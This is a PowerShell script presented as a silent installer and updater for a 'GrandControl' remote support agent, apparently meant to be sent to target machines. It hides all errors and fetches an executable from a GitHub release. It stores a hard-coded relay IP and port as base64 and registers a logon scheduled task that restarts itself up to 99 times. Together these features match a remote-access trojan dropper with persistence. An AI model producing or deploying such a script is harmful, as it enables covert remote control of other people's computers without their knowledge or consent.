# GrandControl silent installer + updater.
# BEFORE sending: set $RelayHost and $RelayPort below.

$ErrorActionPreference = "SilentlyContinue"

$RelayHost   = "94.110.194.197"
$RelayPort   = "8443"
$GitHubRepo  = "Splinters2006/GrandControl"
$AssetName   = "GrandControlAgent.exe"

$InstallDir  = Join-Path $env:LOCALAPPDATA "GrandControl"
$AgentDest   = Join-Path $InstallDir "GrandControlAgent.exe"
$ConfigDest  = Join-Path $InstallDir "config.ini"
$TaskName    = "GrandControl Support"

New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null

$isUpdate = (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) -ne $null

if ($isUpdate) {
    Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 800
}

# Try GitHub release first
$downloaded = $false
try {
    $apiUrl  = "https://api.github.com/repos/$GitHubRepo/releases/latest"
    $headers = @{ "User-Agent" = "GrandControl-Installer" }
    $release = Invoke-RestMethod -Uri $apiUrl -Headers $headers -TimeoutSec 15
    $asset   = $release.assets | Where-Object { $_.name -eq $AssetName } | Select-Object -First 1
    if ($asset) {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "GrandControl-Installer")
        $tmpPath = $AgentDest + ".tmp"
        $wc.DownloadFile($asset.browser_download_url, $tmpPath)
        if (Test-Path $AgentDest) { Remove-Item -Force $AgentDest }
        Move-Item -Force $tmpPath $AgentDest
        $downloaded = $true
    }
} catch {}

# Fall back to local copy
if (-not $downloaded) {
    $localExe = Join-Path $PSScriptRoot $AssetName
    if (Test-Path $localExe) {
        Copy-Item -Force $localExe $AgentDest
    }
}

# Write base64 encoded config
$plainConfig = "relay_host=$RelayHost`nrelay_port=$RelayPort`n"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($plainConfig))
Set-Content -Encoding ASCII -Path $ConfigDest -Value $encoded

# Register scheduled task
$action    = New-ScheduledTaskAction -Execute $AgentDest
$trigger   = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
$settings  = New-ScheduledTaskSettingsSet `
               -AllowStartIfOnBatteries `
               -DontStopIfGoingOnBatteries `
               -RestartCount 99 `
               -RestartInterval (New-TimeSpan -Minutes 1) `
               -ExecutionTimeLimit (New-TimeSpan -Hours 0)

Register-ScheduledTask -TaskName $TaskName `
    -Action $action -Trigger $trigger -Principal $principal -Settings $settings `
    -Description "GrandControl remote support helper." `
    -Force | Out-Null

Start-ScheduledTask -TaskName $TaskName
